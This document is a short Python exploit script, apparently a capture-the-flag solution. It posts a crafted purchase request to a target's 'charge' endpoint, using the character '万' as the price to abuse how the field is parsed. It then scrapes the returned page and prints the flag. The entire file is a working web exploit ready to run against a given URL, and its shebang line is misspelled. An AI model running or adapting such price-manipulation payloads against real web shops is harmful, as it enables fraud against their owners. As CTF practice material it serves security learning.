#! /bin/pytho

from sys import argv

if __name__ == '__main__':
    try:
        url = argv[1]
    except Exception as e:
        print("python3 exp.py url")
    else:
        from requests import post

        payload = {
            "id": "4",
            "price": "万",
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/109.0.0.0 Safari/537.36 "
        }

        url = url + "charge"
        data = post(url=url, data=payload, headers=headers).text

        from lxml.etree import HTML

        data = HTML(data)
        flag = "".join(data.xpath("//div/text()")).replace("\n", "")
        print(flag[5:47])
